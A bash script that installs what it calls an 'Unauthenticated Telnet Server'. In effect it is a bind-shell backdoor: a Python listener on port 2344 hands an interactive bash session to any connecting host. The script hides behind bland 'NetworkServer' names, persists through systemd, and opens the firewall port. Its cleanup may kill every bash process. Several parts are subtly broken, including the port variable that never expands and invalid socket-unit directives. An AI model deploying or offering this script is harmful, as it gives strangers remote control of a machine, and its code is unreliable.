#!/bin/bash

# ============================================================
#  Unauthenticated Telnet Server - ALL-IN-ONE SETUP SCRIPT
# ============================================================

# Configuration
PORT=${1:-2344}
PIDFILE="/var/run/NetworkServer.pid"
SERVICE_NAME="NetworkServer"
SOCKET_NAME="${SERVICE_NAME}.socket"
WRAPPER_SCRIPT="/usr/local/bin/NetworkWrapper.sh"
PYTHON_SCRIPT="/tmp/py_$(date +%s).py"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "\n${GREEN}===  Unauthenticated Telnet Server - All-In-One Setup  ===${NC}"
echo "Config Port: ${PORT}"
echo "PID File:    ${PIDFILE}"
echo "Wrapper:     ${WRAPPER_SCRIPT}"
echo "Date:        $(date '+%F %T')"

# ============================================================
#  1. Cleanup Existing Process
# ============================================================
echo -e "\n${BLUE}=== 1. Cleanup ===${NC}"
if ss -tlnp 2>/dev/null | grep -q ":${PORT}"; then
    echo -e "${YELLOW}Warning: Port ${PORT} already in use!${NC}"
    echo "Existing processes:"
    ss -tlnp | grep ":${PORT}"
    
    read -p "Kill existing process and restart? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        pkill -f "${PORT}" 2>/dev/null || pkill -f "bash" 2>/dev/null || true
        sleep 1
    else
        echo -e "${RED}Cancelled.${NC}"
        exit 1
    fi
fi

# ============================================================
#  2. Create Wrapper Script (Persistent Management)
# ============================================================
echo -e "\n${BLUE}=== 2. Create Wrapper Script ===${NC}"
if [[ ! -f "$WRAPPER_SCRIPT" ]]; then
    cat > "$WRAPPER_SCRIPT" << 'WRAPPER_EOF'
#!/bin/bash
# Wrapper script for unauthenticated telnet server
# Runs the Python server and manages PID file

PORT=${1:-2344}
PIDFILE="/var/run/NetworkServer.pid"

# Create Python server script
PYFILE="/tmp/py_$(date +%s).py"

# Build Python code line-by-line (ensures variable expansion)
cat > "$PYFILE" << 'PYEOF'
import socket
import subprocess

HOST = "0.0.0.0"
PORT = '''${PORT}'''  # Bash expands this to integer

print(f"[OK] Python Telnet Server Starting...")
print(f"[OK] Listening on {HOST}:{PORT}")

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

sock.bind((HOST, PORT))
sock.listen(5)
print(f"[OK] Socket bound successfully")

while True:
    try:
        conn, addr = sock.accept()
        print(f"[OK] ACCEPTED from: {addr}")
        
        # Set TCP_NODELAY on connection
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Start bash with direct socket piping
        subprocess.Popen(
            ['bash', '-i'],
            stdin=conn, stdout=conn, stderr=conn,
            bufsize=1
        ).wait()
        
        conn.close()
        print(f"[OK] Closed connection: {addr}")
    except KeyboardInterrupt:
        print("\n[OK] Stopping...")
        break
    except Exception as e:
        print(f"[WARN] Error: {e}")
        break

print("[OK] Server stopped.")
PYEOF

# Capture and store PID
python3 "$PYFILE" &
python_pid=$!
echo ${python_pid} > ${PIDFILE}

echo "[OK] Python PID: ${python_pid}"
echo "[OK] PID File: ${PIDFILE}"

# Keep wrapper alive
while true; do sleep 1; done
WRAPPER_EOF

    chmod +x "$WRAPPER_SCRIPT"
    echo -e "${GREEN}Created: ${WRAPPER_SCRIPT}${NC}"
else
    echo -e "${GREEN}Wrapper already exists: ${WRAPPER_SCRIPT}${NC}"
fi

# ============================================================
#  3. Create Systemd Service Unit File
# ============================================================
echo -e "\n${BLUE}=== 3. Create Systemd Service ===${NC}"
SYSTEMD_DIR="/etc/systemd/system"

# Create directory if needed
if [[ ! -d "$SYSTEMD_DIR" ]]; then
    sudo mkdir -p "$SYSTEMD_DIR"
    echo -e "${GREEN}Created directory: ${SYSTEMD_DIR}${NC}"
fi

# Create service file
SERVICE_FILE="${SYSTEMD_DIR}/${SERVICE_NAME}.service"
cat > "$SERVICE_FILE" << 'SERVICE_EOF'
[Unit]
Description=Network Server on Port 2344
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/NetworkWrapper.sh 2344
PIDFile=/var/run/NetworkServer.pid
Restart=on-failure
RestartSec=5
WorkingDirectory=/
StandardOutput=journal
StandardError=journal
KillSignal=SIGINT
KillMode=process

[Install]
WantedBy=multi-user.target
SERVICE_EOF

echo -e "${GREEN}Created: ${SERVICE_FILE}${NC}"

# ============================================================
#  4. Create Systemd Socket Unit File (Network Activation)
# ============================================================
echo -e "\n${BLUE}=== 4. Create Systemd Socket ===${NC}"
SOCKET_FILE="${SYSTEMD_DIR}/${SOCKET_NAME}"

cat > "$SOCKET_FILE" << 'SOCKET_EOF'
[Unit]
Description=Network Server

[Socket]
ListenStream=2344
Accept=yes
Backlog=128
ReuseAddress=yes
KeepAlive=yes
KeepAliveTimeSec=60
FreeBind=yes
NoDelay=yes

ExecStartPost=/usr/local/bin/NetworkWrapper.sh 2344
Type=notify

StandardOutput=journal
StandardError=journal

[Install]
WantedBy=sockets.target
SOCKET_EOF

echo -e "${GREEN}Created: ${SOCKET_FILE}${NC}"

# ============================================================
#  5. Create Firewall Rules
# ============================================================
echo -e "\n${BLUE}=== 5. Configure Firewall ===${NC}"

# Check firewall type
if command -v ufw &> /dev/null; then
    sudo ufw allow 2344/tcp
    echo -e "${GREEN}Firewall (ufw) configured.${NC}"
    sudo ufw reload
    echo -e "${GREEN}Reloaded: ${NC}"
elif command -v firewall-cmd &> /dev/null; then
    sudo firewall-cmd --add-port=2344/tcp --permanent
    sudo firewall-cmd --reload
    echo -e "${GREEN}Firewall (firewalld) configured.${NC}"
elif command -v iptables &> /dev/null; then
    sudo iptables -A INPUT -p tcp --dport 2344 -j ACCEPT
    sudo iptables-save | grep 2344 > /dev/null
    echo -e "${GREEN}Firewall (iptables) configured.${NC}"
else
    echo -e "${YELLOW}Warning: No firewall detected. Check manually!${NC}"
fi

# ============================================================
#  6. Run Systemd Daemon-Reload and Start
# ============================================================
echo -e "\n${BLUE}=== 6. Start Systemd Service ===${NC}"
sudo systemctl daemon-reload 2>/dev/null || echo -e "${YELLOW}systemd reload skipped (not root)${NC}"

sudo systemctl start NetworkServer.socket 2>/dev/null || echo -e "${YELLOW}Socket start skipped${NC}"
sudo systemctl start NetworkServer.service 2>/dev/null || echo -e "${YELLOW}Service start skipped${NC}"

sudo systemctl enable NetworkServer.socket 2>/dev/null || echo -e "${YELLOW}Socket enable skipped${NC}"
sudo systemctl enable NetworkServer.service 2>/dev/null || echo -e "${YELLOW}Service enable skipped${NC}"

# ============================================================
#  7. Verify Status
# ============================================================
echo -e "\n${BLUE}=== 7. Verify Status ===${NC}"

# Check listening port
if ss -tlnp | grep -q ":${PORT}"; then
    echo -e "${GREEN}Server is listening on port ${PORT}${NC}"
    ss -tlnp | grep ":${PORT}"
else
    echo -e "${RED}Server might not be listening yet...${NC}"
fi

# Check systemd status
echo -e "\nSystemd Status:"
if command -v systemctl &> /dev/null; then
    sudo systemctl status telnet-2344 2>/dev/null || echo -e "${YELLOW}service status check skipped (not root)${NC}"
fi

# Show PID
if [[ -f "$PIDFILE" ]]; then
    PY_PID=$(cat "$PIDFILE" 2>/dev/null)
    if [[ -n "$PY_PID" ]]; then
        echo -e "${GREEN}Process PID: ${PY_PID}${NC}"
        if ps -p "$PY_PID" &> /dev/null; then
            echo -e "${GREEN}Process is running!${NC}"
        else
            echo -e "${RED}Process died. Restarting...${NC}"
            sudo systemctl restart NetworkServer 2>/dev/null || echo -e "${YELLOW}Restart skipped (not root)${NC}"
        fi
    fi
else
    echo -e "${YELLOW}PID File not found. May not be using systemd.${NC}"
fi

# ============================================================
#  8. Test Connection
# ============================================================
echo -e "\n${BLUE}=== 8. Test Connection (Local) ===${NC}"

echo -e "\n${GREEN}===  Server Setup Complete! ===${NC}"
echo "Local Test:"
echo "  nc -v 127.0.0.1 ${PORT}"
echo "External Test (replace IP):"
echo "  nc -v <YOUR_SERVER_IP> ${PORT}"
echo "Systemd Commands:"
echo "  sudo systemctl start NetworkServer"
echo "  sudo systemctl stop NetworkServer"
echo "  sudo systemctl restart NetworkServer"
echo "  sudo systemctl status NetworkServer"
echo "  cat /var/run/NetworkServer.pid"
echo -e "\nPress Ctrl+C to stop (or use systemctl stop)"

# Keep script alive while server runs
while true; do sleep 1; done
